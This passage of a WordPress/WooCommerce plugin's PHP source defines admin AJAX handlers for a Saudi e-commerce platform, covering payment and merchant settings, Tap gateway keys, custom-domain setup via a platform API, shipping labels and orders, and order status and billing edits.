add_action( 'wp_ajax_yamamah_save_payment_settings', 'yamamah_ajax_save_payment_settings' );
function yamamah_ajax_save_payment_settings() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );

    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( 'غير مصرح' );
    }

    $data = $_POST['payment_settings'] ?? array();
    if ( ! is_array( $data ) ) {
        wp_send_json_error( 'بيانات غير صالحة' );
    }

    $sanitized = array(
        'entity_type'          => sanitize_text_field( $data['entity_type'] ?? 'LLC' ),
        'company_type'         => sanitize_text_field( $data['company_type'] ?? '' ),
        'brand_name'           => sanitize_text_field( $data['brand_name'] ?? '' ),
        'legal_name'           => sanitize_text_field( $data['legal_name'] ?? '' ),
        'first_name'           => sanitize_text_field( $data['first_name'] ?? '' ),
        'middle_name'          => sanitize_text_field( $data['middle_name'] ?? '' ),
        'last_name'            => sanitize_text_field( $data['last_name'] ?? '' ),
        'national_id'          => sanitize_text_field( $data['national_id'] ?? '' ),
        'identification_type'  => sanitize_text_field( $data['identification_type'] ?? 'national_id' ),
        'nationality'          => sanitize_text_field( $data['nationality'] ?? 'SA' ),
        'birth_date'           => sanitize_text_field( $data['birth_date'] ?? '' ),
        'hijri_year'           => sanitize_text_field( $data['hijri_year'] ?? '' ),
        'hijri_month'          => sanitize_text_field( $data['hijri_month'] ?? '' ),
        'hijri_day'            => sanitize_text_field( $data['hijri_day'] ?? '' ),
        'license_number'       => sanitize_text_field( $data['license_number'] ?? $data['license_number_cr'] ?? $data['license_number_company'] ?? '' ),
        'license_issue_date'   => sanitize_text_field( $data['license_issue_date'] ?? '' ),
        'license_expiry_date'  => sanitize_text_field( $data['license_expiry_date'] ?? '' ),
        'tax_number'           => sanitize_text_field( $data['tax_number'] ?? '' ),
        'tax_issue_date'       => sanitize_text_field( $data['tax_issue_date'] ?? '' ),
        'tax_expiry_date'      => sanitize_text_field( $data['tax_expiry_date'] ?? '' ),
        'national_address'     => sanitize_text_field( $data['national_address'] ?? '' ),
        'iban'                 => sanitize_text_field( $data['iban'] ?? '' ),
        'bank_name'            => sanitize_text_field( $data['bank_name'] ?? '' ),
        'bank_account_no'      => sanitize_text_field( $data['bank_account_no'] ?? '' ),
        'bank_swift'           => sanitize_text_field( $data['bank_swift'] ?? '' ),
        'personal_email'       => sanitize_email( $data['personal_email'] ?? '' ),
        'executive_email'      => sanitize_email( $data['executive_email'] ?? '' ),
        'personal_phone'       => sanitize_text_field( $data['personal_phone'] ?? '' ),
        'authorized_phone'     => sanitize_text_field( $data['authorized_phone'] ?? '' ),
        'monthly_sales'        => sanitize_text_field( $data['monthly_sales'] ?? '10000' ),
        'category_description' => sanitize_text_field( $data['category_description'] ?? '' ),
        'selling_scope'        => sanitize_text_field( $data['selling_scope'] ?? 'domestic' ),
        'license_file'         => esc_url_raw( $data['license_file'] ?? '' ),
        'commercial_file'      => esc_url_raw( $data['commercial_file'] ?? '' ),
        'founding_file'        => esc_url_raw( $data['founding_file'] ?? '' ),
        'iban_file'            => esc_url_raw( $data['iban_file'] ?? '' ),
    );

    update_option( 'yamamah_payment_settings', $sanitized );
    wp_send_json_success( 'تم الحفظ بنجاح' );
}

// ======== AJAX: Save Tap Merchant Keys (legacy fallback — keys now flow via REST sync-merchant) ========
add_action( 'wp_ajax_yamamah_save_tap_keys', 'yamamah_ajax_save_tap_keys' );
function yamamah_ajax_save_tap_keys() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );

    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( array( 'message' => 'غير مصرح' ) );
    }

    if ( function_exists( 'yamamah_plan_allows' ) && ! yamamah_plan_allows( 'electronic_payment' ) ) {
        wp_send_json_error( array( 'message' => 'الدفع الإلكتروني غير متاح في باقتك الحالية. قم بترقية الباقة لتفعيل هذه الميزة.' ) );
    }

    $merchant_id   = sanitize_text_field( $_POST['merchant_id'] ?? '' );
    $secret_key    = sanitize_text_field( $_POST['secret_key'] ?? '' );
    $technology_id = sanitize_text_field( $_POST['technology_id'] ?? '' );
    $platform_id   = sanitize_text_field( $_POST['platform_id'] ?? '' );
    $livemode      = ! empty( $_POST['livemode'] ) ? 1 : 0;
    $test_mode     = ! empty( $_POST['test_mode'] ) ? 1 : 0;

    if ( $merchant_id )   update_option( 'yamama_tap_merchant_id', $merchant_id, false );
    if ( $secret_key )    update_option( 'yamama_tap_secret_key', $secret_key, false );
    if ( $technology_id ) update_option( 'yamama_tap_technology_id', $technology_id, false );
    if ( $platform_id )   update_option( 'yamama_tap_platform_id', $platform_id, false );
    update_option( 'yamama_tap_livemode', $livemode, false );
    update_option( 'yamama_tap_test_mode', $test_mode, false );

    if ( $merchant_id && $secret_key ) {
        $tap_settings = get_option( 'woocommerce_tap_settings', array() );
        if ( ! is_array( $tap_settings ) ) $tap_settings = array();
        $tap_settings['enabled'] = 'yes';
        update_option( 'woocommerce_tap_settings', $tap_settings );
    }

    wp_send_json_success( array( 'message' => 'تم حفظ بيانات Tap بنجاح وتفعيل البوابة.' ) );
}

// ======== AJAX: Attach Custom Domain ========
add_action( 'wp_ajax_yamamah_attach_domain', 'yamamah_ajax_attach_domain' );
function yamamah_ajax_attach_domain() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( array( 'message' => 'غير مصرح' ) );
    }
    if ( function_exists( 'yamamah_plan_allows' ) && ! yamamah_plan_allows( 'custom_domain' ) ) {
        wp_send_json_error( array( 'message' => 'النطاق المخصص غير متاح في باقتك الحالية. قم بترقية الباقة لتفعيل هذه الميزة.' ) );
    }

    $domain = sanitize_text_field( wp_unslash( $_POST['domain'] ?? '' ) );
    if ( empty( $domain ) ) {
        wp_send_json_error( array( 'message' => 'يرجى إدخال اسم النطاق.' ) );
    }
    $domain = preg_replace( '#^https?://#', '', $domain );
    $domain = rtrim( $domain, '/' );

    $store_id    = get_option( 'yamama_store_id', '' );
    $factory_url = rtrim( get_option( 'yamama_factory_url', '' ), '/' );
    $api_token   = get_option( 'yamama_api_token', '' );

    if ( empty( $store_id ) || empty( $factory_url ) ) {
        wp_send_json_error( array( 'message' => 'المتجر غير مرتبط بالخادم.' ) );
    }

    $url = $factory_url . '/stores/' . $store_id . '/domain';
    $response = wp_remote_post( $url, array(
        'headers' => array(
            'Content-Type' => 'application/json',
            'x-api-key'    => $api_token,
        ),
        'body'    => wp_json_encode( array( 'domain' => $domain ) ),
        'timeout' => 30,
    ) );

    if ( is_wp_error( $response ) ) {
        wp_send_json_error( array( 'message' => 'فشل الاتصال بالخادم: ' . $response->get_error_message() ) );
    }

    $body = json_decode( wp_remote_retrieve_body( $response ), true );
    $code = wp_remote_retrieve_response_code( $response );

    if ( $code >= 400 ) {
        wp_send_json_error( array( 'message' => $body['error'] ?? 'خطأ من الخادم.' ) );
    }

    update_option( 'yamama_custom_domain', $domain );
    update_option( 'yamama_domain_status', 'pending_dns' );
    if ( ! empty( $body['dns_instructions'][0]['value'] ) ) {
        update_option( 'yamama_dns_target_ip', $body['dns_instructions'][0]['value'] );
    }

    wp_send_json_success( array(
        'message'          => 'تم ربط النطاق. أضف سجل DNS المطلوب.',
        'dns_instructions' => $body['dns_instructions'] ?? array(),
    ) );
}

// ======== AJAX: Verify Domain DNS ========
add_action( 'wp_ajax_yamamah_verify_domain', 'yamamah_ajax_verify_domain' );
function yamamah_ajax_verify_domain() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( array( 'message' => 'غير مصرح' ) );
    }

    $domain      = get_option( 'yamama_custom_domain', '' );
    $store_id    = get_option( 'yamama_store_id', '' );
    $factory_url = rtrim( get_option( 'yamama_factory_url', '' ), '/' );
    $api_token   = get_option( 'yamama_api_token', '' );

    if ( empty( $domain ) || empty( $store_id ) || empty( $factory_url ) ) {
        wp_send_json_error( array( 'message' => 'بيانات غير مكتملة.' ) );
    }

    update_option( 'yamama_domain_status', 'verifying' );

    $url = $factory_url . '/stores/' . $store_id . '/domain/verify';
    $response = wp_remote_post( $url, array(
        'headers' => array(
            'Content-Type' => 'application/json',
            'x-api-key'    => $api_token,
        ),
        'body'    => wp_json_encode( array( 'domain' => $domain ) ),
        'timeout' => 60,
    ) );

    if ( is_wp_error( $response ) ) {
        update_option( 'yamama_domain_status', 'pending_dns' );
        wp_send_json_error( array( 'message' => 'فشل الاتصال: ' . $response->get_error_message() ) );
    }

    $body = json_decode( wp_remote_retrieve_body( $response ), true );
    $code = wp_remote_retrieve_response_code( $response );

    if ( $code >= 400 ) {
        update_option( 'yamama_domain_status', 'pending_dns' );
        $hint = ! empty( $body['hint'] ) ? ' — ' . $body['hint'] : '';
        wp_send_json_error( array( 'message' => ( $body['error'] ?? 'لم يتم التحقق.' ) . $hint ) );
    }

    wp_send_json_success( array(
        'message' => 'تم التحقق من DNS. جاري إصدار الشهادة وتفعيل النطاق...',
        'job_id'  => $body['job_id'] ?? '',
    ) );
}

// ======== AJAX: Poll Domain Job Status ========
add_action( 'wp_ajax_yamamah_poll_domain_job', 'yamamah_ajax_poll_domain_job' );
function yamamah_ajax_poll_domain_job() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( array( 'message' => 'غير مصرح' ) );
    }

    $store_id    = get_option( 'yamama_store_id', '' );
    $factory_url = rtrim( get_option( 'yamama_factory_url', '' ), '/' );
    $api_token   = get_option( 'yamama_api_token', '' );

    if ( empty( $store_id ) || empty( $factory_url ) ) {
        wp_send_json_error( array( 'message' => 'بيانات غير مكتملة.' ) );
    }

    $url = $factory_url . '/stores/' . $store_id . '/domain/status';
    $response = wp_remote_get( $url, array(
        'headers' => array( 'x-api-key' => $api_token ),
        'timeout' => 15,
    ) );

    if ( is_wp_error( $response ) ) {
        wp_send_json_error( array( 'message' => 'فشل الاتصال: ' . $response->get_error_message() ) );
    }

    $body = json_decode( wp_remote_retrieve_body( $response ), true );
    $code = wp_remote_retrieve_response_code( $response );

    if ( $code >= 400 ) {
        wp_send_json_error( array( 'message' => $body['error'] ?? 'خطأ في جلب الحالة.' ) );
    }

    if ( ! empty( $body['status'] ) && $body['status'] === 'completed' ) {
        update_option( 'yamama_domain_status', 'active' );
    } elseif ( ! empty( $body['status'] ) && $body['status'] === 'failed' ) {
        update_option( 'yamama_domain_status', 'pending_dns' );
        update_option( 'yamama_custom_domain', '' );
    }

    wp_send_json_success( $body );
}

// ======== AJAX: Remove Custom Domain ========
add_action( 'wp_ajax_yamamah_remove_domain', 'yamamah_ajax_remove_domain' );
function yamamah_ajax_remove_domain() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( array( 'message' => 'غير مصرح' ) );
    }

    $store_id    = get_option( 'yamama_store_id', '' );
    $factory_url = rtrim( get_option( 'yamama_factory_url', '' ), '/' );
    $api_token   = get_option( 'yamama_api_token', '' );

    if ( empty( $store_id ) || empty( $factory_url ) ) {
        wp_send_json_error( array( 'message' => 'المتجر غير مرتبط بالخادم.' ) );
    }

    $url = $factory_url . '/stores/' . $store_id . '/domain';
    $response = wp_remote_request( $url, array(
        'method'  => 'DELETE',
        'headers' => array( 'x-api-key' => $api_token ),
        'timeout' => 30,
    ) );

    if ( is_wp_error( $response ) ) {
        wp_send_json_error( array( 'message' => 'فشل الاتصال: ' . $response->get_error_message() ) );
    }

    $body = json_decode( wp_remote_retrieve_body( $response ), true );
    $code = wp_remote_retrieve_response_code( $response );

    if ( $code >= 400 ) {
        wp_send_json_error( array( 'message' => $body['error'] ?? 'فشل إزالة النطاق.' ) );
    }

    update_option( 'yamama_custom_domain', '' );
    update_option( 'yamama_domain_status', '' );
    update_option( 'yamama_dns_target_ip', '' );

    $staging_url = $body['store_url'] ?? '';

    wp_send_json_success( array(
        'message'  => 'تم إزالة النطاق المخصص.',
        'redirect' => $staging_url ? $staging_url . '/wp-admin/admin.php?page=yamamah-settings-domain' : '',
    ) );
}

// ======== AJAX: Save Shipping Settings ========
add_action( 'wp_ajax_yamamah_save_shipping_settings', 'yamamah_ajax_save_shipping_settings' );
function yamamah_ajax_save_shipping_settings() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );

    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( 'غير مصرح' );
    }

    $data = $_POST['shipper'] ?? array();
    if ( ! is_array( $data ) ) {
        wp_send_json_error( 'بيانات غير صالحة' );
    }

    $sanitized = array(
        'name'             => sanitize_text_field( $data['name'] ?? '' ),
        'phone'            => sanitize_text_field( $data['phone'] ?? '' ),
        'country'          => sanitize_text_field( $data['country'] ?? 'SA' ),
        'city'             => sanitize_text_field( $data['city'] ?? '' ),
        'district'         => sanitize_text_field( $data['district'] ?? '' ),
        'address1'         => sanitize_text_field( $data['address1'] ?? '' ),
        'address2'         => sanitize_text_field( $data['address2'] ?? '' ),
        'national_address' => sanitize_text_field( $data['national_address'] ?? '' ),
    );

    update_option( 'yamama_shipping_shipper', $sanitized );
    wp_send_json_success( 'تم الحفظ بنجاح' );
}

// ======== AJAX: Re-register Shipping (proxy) ========
add_action( 'wp_ajax_yamamah_reregister_shipping', 'yamamah_ajax_reregister_shipping' );
function yamamah_ajax_reregister_shipping() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );

    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( array( 'message' => 'غير مصرح' ) );
    }

    if ( ! class_exists( 'Yamama_Shipping_Client' ) ) {
        wp_send_json_error( array( 'message' => 'إضافة الشحن غير مفعلة' ) );
    }

    delete_option( 'yamama_shipping_api_token' );
    delete_option( 'yamama_shipping_hmac_secret' );
    delete_option( 'yamama_shipping_registered_url' );

    $success = Yamama_Shipping_Client::ensure_registered( true );

    if ( $success ) {
        wp_send_json_success( array(
            'message' => 'تم إعادة التسجيل بنجاح.',
        ));
    } else {
        $debug = Yamama_Shipping_Client::get_registration_debug();
        wp_send_json_error( array(
            'message' => 'فشل إعادة التسجيل: ' . ( $debug['last_registration_error'] ?: 'خطأ غير معروف' ),
        ));
    }
}

// ======== AJAX: Fetch Shipping Label (proxy) ========
add_action( 'wp_ajax_yamamah_fetch_label', 'yamamah_ajax_fetch_label' );
function yamamah_ajax_fetch_label() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );

    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( array( 'message' => 'غير مصرح' ) );
    }

    if ( ! class_exists( 'Yamama_Shipping_Client' ) ) {
        wp_send_json_error( array( 'message' => 'إضافة الشحن غير مفعلة' ) );
    }

    $order_id = absint( $_POST['order_id'] ?? 0 );
    if ( $order_id <= 0 ) {
        wp_send_json_error( array( 'message' => 'معرف الطلب مفقود' ) );
    }

    $order = wc_get_order( $order_id );
    if ( ! $order ) {
        wp_send_json_error( array( 'message' => 'الطلب غير موجود' ) );
    }

    $lamha_order_id = (string) $order->get_meta( '_yamama_lamha_order_id', true );
    if ( $lamha_order_id === '' ) {
        wp_send_json_error( array( 'message' => 'لا يوجد طلب شحنة لهذا الطلب' ) );
    }

    $existing_label = (string) $order->get_meta( '_yamama_label_url', true );
    if ( $existing_label !== '' ) {
        wp_send_json_success( array(
            'label_url'       => $existing_label,
            'tracking_number' => (string) $order->get_meta( '_yamama_tracking_number', true ),
        ));
        return;
    }

    $result = Yamama_Shipping_Client::request( 'GET', '/label-shipment/' . $lamha_order_id );

    if ( is_wp_error( $result ) ) {
        wp_send_json_error( array( 'message' => $result->get_error_message() ) );
    }

    $pdf_url = '';
    if ( isset( $result['pdf_url'] ) ) {
        $pdf_url = esc_url_raw( (string) $result['pdf_url'] );
    } elseif ( isset( $result['data']['pdf_url'] ) ) {
        $pdf_url = esc_url_raw( (string) $result['data']['pdf_url'] );
    }

    $pdf_base64 = '';
    if ( isset( $result['pdf_base64'] ) && (string) $result['pdf_base64'] !== '' ) {
        $pdf_base64 = (string) $result['pdf_base64'];
    } elseif ( isset( $result['data']['pdf_base64'] ) && (string) $result['data']['pdf_base64'] !== '' ) {
        $pdf_base64 = (string) $result['data']['pdf_base64'];
    }

    if ( $pdf_base64 === '' && $pdf_url === '' ) {
        wp_send_json_error( array( 'message' => 'البوليصة غير متوفرة حالياً' ) );
    }

    if ( $pdf_url !== '' ) {
        $order->update_meta_data( '_yamama_label_url', $pdf_url );
        $order->save();
    }

    $response = array(
        'tracking_number' => (string) $order->get_meta( '_yamama_tracking_number', true ),
    );

    if ( $pdf_base64 !== '' ) {
        $response['pdf_base64'] = $pdf_base64;
    } else {
        $response['label_url'] = $pdf_url;
    }

    wp_send_json_success( $response );
}

/**
 * Bridge helper — run Yamama_Shipping_Admin AJAX after minting its nonce.
 *
 * @param callable $callback
 */
function yamamah_bridge_shipping_action( $callback ) {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( array( 'message' => 'غير مصرح' ) );
    }
    if ( ! class_exists( 'Yamama_Shipping_Admin' ) || ! class_exists( 'Yamama_Shipping_Client' ) ) {
        wp_send_json_error( array( 'message' => 'إضافة الشحن غير مفعلة' ) );
    }
    $shipping_nonce     = wp_create_nonce( 'yamama_shipping_nonce' );
    $_REQUEST['nonce']  = $shipping_nonce;
    $_POST['nonce']     = $shipping_nonce;
    call_user_func( $callback );
}

add_action( 'wp_ajax_yamamah_get_shipping_orders', 'yamamah_ajax_get_shipping_orders' );
function yamamah_ajax_get_shipping_orders() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( array( 'message' => 'غير مصرح' ) );
    }

    $page   = max( 1, absint( $_REQUEST['page_num'] ?? $_REQUEST['page'] ?? 1 ) );
    $filter = sanitize_text_field( $_REQUEST['filter'] ?? 'all' );
    $search = sanitize_text_field( $_REQUEST['s'] ?? '' );

    $args = array(
        'limit'    => 20,
        'page'     => $page,
        'orderby'  => 'date',
        'order'    => 'DESC',
        'status'   => array( 'wc-processing', 'wc-on-hold', 'wc-completed', 'wc-shipped', 'wc-returned', 'wc-pending', 'wc-failed' ),
        'paginate' => true,
    );
    if ( $search !== '' ) {
        $args['s'] = $search;
    }

    $results = wc_get_orders( $args );
    $orders  = is_object( $results ) ? $results->orders : (array) $results;
    $total   = is_object( $results ) ? (int) $results->total : count( $orders );

    $rows = array();
    foreach ( $orders as $order ) {
        if ( ! is_a( $order, 'WC_Order' ) ) {
            continue;
        }
        $lamha_id = (string) $order->get_meta( '_yamama_lamha_order_id', true );
        $shipped  = $lamha_id !== '';
        if ( $filter === 'shipped' && ! $shipped ) {
            continue;
        }
        if ( $filter === 'not_shipped' && $shipped ) {
            continue;
        }
        $customer = trim( $order->get_billing_first_name() . ' ' . $order->get_billing_last_name() );
        $rows[]   = array(
            'id'              => $order->get_id(),
            'number'          => $order->get_order_number(),
            'customer'        => $customer !== '' ? $customer : 'زائر',
            'total'           => (float) $order->get_total(),
            'status'          => $order->get_status(),
            'status_label'    => wc_get_order_status_name( $order->get_status() ),
            'date'            => $order->get_date_created() ? $order->get_date_created()->date( 'Y-m-d' ) : '',
            'shipped'         => $shipped,
            'lamha_order_id'  => $lamha_id,
            'tracking_number' => (string) $order->get_meta( '_yamama_tracking_number', true ),
            'shipment_status' => (string) $order->get_meta( '_yamama_shipment_status', true ),
            'shipment_status_name' => (string) $order->get_meta( '_yamama_shipment_status_name', true ),
            'shipping_cost'   => (string) $order->get_meta( '_yamama_shipping_cost', true ),
        );
    }

    wp_send_json_success(
        array(
            'orders'  => $rows,
            'total'   => $total,
            'page'    => $page,
            'allowed' => ! function_exists( 'yamamah_plan_allows' ) || yamamah_plan_allows( 'shipping' ),
        )
    );
}

add_action( 'wp_ajax_yamamah_get_shipping_order', 'yamamah_ajax_get_shipping_order' );
function yamamah_ajax_get_shipping_order() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( array( 'message' => 'غير مصرح' ) );
    }

    $order_id = absint( $_REQUEST['order_id'] ?? 0 );
    $order    = $order_id ? wc_get_order( $order_id ) : null;
    if ( ! $order ) {
        wp_send_json_error( array( 'message' => 'الطلب غير موجود' ) );
    }

    $shipper = get_option( 'yamama_shipping_shipper', array() );
    if ( ! is_array( $shipper ) ) {
        $shipper = array();
    }
    if ( class_exists( 'Yamama_Shipping_Admin' ) && method_exists( 'Yamama_Shipping_Admin', 'get_shipper_defaults' ) ) {
        $shipper = Yamama_Shipping_Admin::get_shipper_defaults();
    }

    $customer_name = trim( $order->get_shipping_first_name() . ' ' . $order->get_shipping_last_name() );
    if ( $customer_name === '' ) {
        $customer_name = trim( $order->get_billing_first_name() . ' ' . $order->get_billing_last_name() );
    }

    $items = array();
    $weight_total = 0;
    foreach ( $order->get_items() as $item ) {
        if ( ! is_a( $item, 'WC_Order_Item_Product' ) ) {
            continue;
        }
        $product = $item->get_product();
        $qty     = max( 1, (int) $item->get_quantity() );
        $weight  = $product ? (float) $product->get_weight() : 0.5;
        if ( $weight <= 0 ) {
            $weight = 0.5;
        }
        $weight_total += $weight * $qty;
        $items[] = array(
            'name'     => (string) $item->get_name(),
            'quantity' => $qty,
            'Sku'      => $product ? (string) $product->get_sku() : '',
            'amount'   => number_format( (float) $item->get_total() / $qty, 2, '.', '' ),
            'weight'   => number_format( $weight, 2, '.', '' ),
        );
    }

    $lamha_payment = 'cod';
    if ( class_exists( 'Yamama_Shipping_Hooks' ) && method_exists( 'Yamama_Shipping_Hooks', 'map_wc_payment_method' ) ) {
        $lamha_payment = Yamama_Shipping_Hooks::map_wc_payment_method( (string) $order->get_payment_method() );
    }

    wp_send_json_success(
        array(
            'id'              => $order->get_id(),
            'number'          => $order->get_order_number(),
            'status'          => $order->get_status(),
            'status_label'    => wc_get_order_status_name( $order->get_status() ),
            'total'           => (float) $order->get_total(),
            'subtotal'        => (float) $order->get_subtotal(),
            'discount'        => (float) $order->get_discount_total(),
            'currency'        => $order->get_currency(),
            'date'            => $order->get_date_created() ? $order->get_date_created()->date( 'Y-m-d H:i:s' ) : '',
            'shipped'         => (string) $order->get_meta( '_yamama_lamha_order_id', true ) !== '',
            'lamha_order_id'  => (string) $order->get_meta( '_yamama_lamha_order_id', true ),
            'tracking_number' => (string) $order->get_meta( '_yamama_tracking_number', true ),
            'tracking_link'   => (string) $order->get_meta( '_yamama_tracking_link', true ),
            'label_url'       => (string) $order->get_meta( '_yamama_label_url', true ),
            'shipping_cost'   => (string) $order->get_meta( '_yamama_shipping_cost', true ),
            'shipment_status' => (string) $order->get_meta( '_yamama_shipment_status', true ),
            'shipment_status_name' => (string) $order->get_meta( '_yamama_shipment_status_name', true ),
            'payment_method'  => $lamha_payment,
            'weight_total'    => $weight_total > 0 ? $weight_total : 1,
            'items'           => $items,
            'customer'        => array(
                'name'             => $customer_name,
                'phone'            => (string) $order->get_billing_phone(),
                'email'            => (string) $order->get_billing_email(),
                'country'          => $order->get_shipping_country() ?: $order->get_billing_country() ?: 'SA',
                'city'             => $order->get_shipping_city() ?: $order->get_billing_city(),
                'address1'         => $order->get_shipping_address_1() ?: $order->get_billing_address_1(),
                'address2'         => $order->get_shipping_address_2() ?: $order->get_billing_address_2(),
                'district'         => '',
                'national_address' => '',
            ),
            'shipper'         => $shipper,
        )
    );
}

add_action( 'wp_ajax_yamamah_get_shipping_settings', 'yamamah_ajax_get_shipping_settings' );
function yamamah_ajax_get_shipping_settings() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( array( 'message' => 'غير مصرح' ) );
    }

    $shipper = array(
        'name' => '', 'phone' => '', 'country' => 'SA', 'city' => '',
        'district' => '', 'address1' => '', 'address2' => '', 'national_address' => '',
    );
    if ( class_exists( 'Yamama_Shipping_Admin' ) && method_exists( 'Yamama_Shipping_Admin', 'get_shipper_defaults' ) ) {
        $shipper = Yamama_Shipping_Admin::get_shipper_defaults();
    } else {
        $saved = get_option( 'yamama_shipping_shipper', array() );
        if ( is_array( $saved ) ) {
            $shipper = wp_parse_args( $saved, $shipper );
        }
    }

    $has_credentials = false;
    $debug           = array();
    $middleware_url  = '';
    if ( class_exists( 'Yamama_Shipping_Client' ) ) {
        $has_credentials = Yamama_Shipping_Client::credentials_exist();
        $debug           = Yamama_Shipping_Client::get_registration_debug();
        $client_settings = Yamama_Shipping_Client::get_settings();
        $middleware_url  = $client_settings['middleware_base_url'] ?? '';
    }

    wp_send_json_success(
        array(
            'shipper'         => $shipper,
            'has_credentials' => $has_credentials,
            'debug'           => $debug,
            'middleware_url'  => $middleware_url,
            'tap_enabled'     => ! empty( get_option( 'yamama_tap_merchant_id', '' ) ),
            'allowed'         => ! function_exists( 'yamamah_plan_allows' ) || yamamah_plan_allows( 'shipping' ),
        )
    );
}

add_action( 'wp_ajax_yamamah_get_shipping_carriers', function () {
    yamamah_bridge_shipping_action( array( 'Yamama_Shipping_Admin', 'ajax_get_carriers' ) );
} );
add_action( 'wp_ajax_yamamah_get_shipping_quote', function () {
    yamamah_bridge_shipping_action( array( 'Yamama_Shipping_Admin', 'ajax_get_quote' ) );
} );
add_action( 'wp_ajax_yamamah_save_shipping_pending', function () {
    yamamah_bridge_shipping_action( array( 'Yamama_Shipping_Admin', 'ajax_save_pending' ) );
} );
add_action( 'wp_ajax_yamamah_create_shipping_order', function () {
    yamamah_bridge_shipping_action( array( 'Yamama_Shipping_Admin', 'ajax_create_order' ) );
} );
add_action( 'wp_ajax_yamamah_get_shipping_wallet', function () {
    yamamah_bridge_shipping_action( array( 'Yamama_Shipping_Admin', 'ajax_get_wallet' ) );
} );
add_action( 'wp_ajax_yamamah_get_shipping_pricing', function () {
    yamamah_bridge_shipping_action( array( 'Yamama_Shipping_Admin', 'ajax_get_platform_pricing' ) );
} );
add_action( 'wp_ajax_yamamah_request_shipping_withdraw', function () {
    yamamah_bridge_shipping_action( array( 'Yamama_Shipping_Admin', 'ajax_request_wallet_withdraw' ) );
} );

/* ========================================
 * AJAX — Update Order Status
 * ======================================== */
add_action( 'wp_ajax_yamamah_update_order_status', 'yamamah_ajax_update_order_status' );
function yamamah_ajax_update_order_status() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( array( 'message' => 'غير مصرح' ) );
    }

    $order_id = isset( $_POST['order_id'] ) ? absint( $_POST['order_id'] ) : 0;
    $status   = isset( $_POST['status'] ) ? sanitize_text_field( $_POST['status'] ) : '';

    if ( ! $order_id || ! $status ) {
        wp_send_json_error( array( 'message' => 'بيانات غير صالحة' ) );
    }

    $order = wc_get_order( $order_id );
    if ( ! $order ) {
        wp_send_json_error( array( 'message' => 'الطلب غير موجود' ) );
    }

    $order->update_status( $status );

    // Bug #86: إعادة التسمية والصنف للحارة حتى تُحدَّث الشارة فوراً في المتصفح.
    $status_map = array(
        'pending'    => array( 'label' => 'بانتظار الدفع', 'class' => 'badge-yellow' ),
        'processing' => array( 'label' => 'قيد المعالجة',  'class' => 'badge-yellow' ),
        'on-hold'    => array( 'label' => 'معلّق',         'class' => 'badge-amber' ),
        'shipped'    => array( 'label' => 'قيد التوصيل',   'class' => 'badge-blue' ),
        'completed'  => array( 'label' => 'مكتمل',        'class' => 'badge-green' ),
        'cancelled'  => array( 'label' => 'ملغي',          'class' => 'badge-red' ),
        'refunded'   => array( 'label' => 'مسترد',         'class' => 'badge-purple' ),
        'failed'     => array( 'label' => 'فاشل',          'class' => 'badge-red' ),
    );
    $cfg = $status_map[ $status ] ?? array( 'label' => $status, 'class' => 'badge-gray' );
    wp_send_json_success( array( 'label' => $cfg['label'], 'badge_class' => $cfg['class'] ) );
}

/* ========================================
 * AJAX — Update Order Billing Info
 * ======================================== */
add_action( 'wp_ajax_yamamah_update_order_billing', 'yamamah_ajax_update_order_billing' );
function yamamah_ajax_update_order_billing() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( 'غير مصرح' );
    }

    $order_id = isset( $_POST['order_id'] ) ? absint( $_POST['order_id'] ) : 0;
    $order    = wc_get_order( $order_id );
    if ( ! $order ) {
        wp_send_json_error( 'الطلب غير موجود' );
    }

    $order->set_billing_first_name( sanitize_text_field( $_POST['billing_first_name'] ?? '' ) );
    $order->set_billing_last_name( sanitize_text_field( $_POST['billing_last_name'] ?? '' ) );
    $order->set_billing_email( sanitize_email( $_POST['billing_email'] ?? '' ) );
    $order->set_billing_phone( sanitize_text_field( $_POST['billing_phone'] ?? '' ) );
    $order->save();

    wp_send_json_success( 'تم الحفظ' );
}

/* ========================================
 * AJAX — Update Order Shipping Address
 * ======================================== */
add_action( 'wp_ajax_yamamah_update_order_address', 'yamamah_ajax_update_order_address' );
function yamamah_ajax_update_order_address() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( 'غير مصرح' );
    }

    $order_id = isset( $_POST['order_id'] ) ? absint( $_POST['order_id'] ) : 0;
    $order    = wc_get_order( $order_id );
    if ( ! $order ) {
        wp_send_json_error( 'الطلب غير موجود' );
    }

    $address_1 = sanitize_text_field( $_POST['address_1'] ?? '' );
    $address_2 = sanitize_text_field( $_POST['address_2'] ?? '' );
    $city      = sanitize_text_field( $_POST['city'] ?? '' );
    $state     = sanitize_text_field( $_POST['state'] ?? '' );
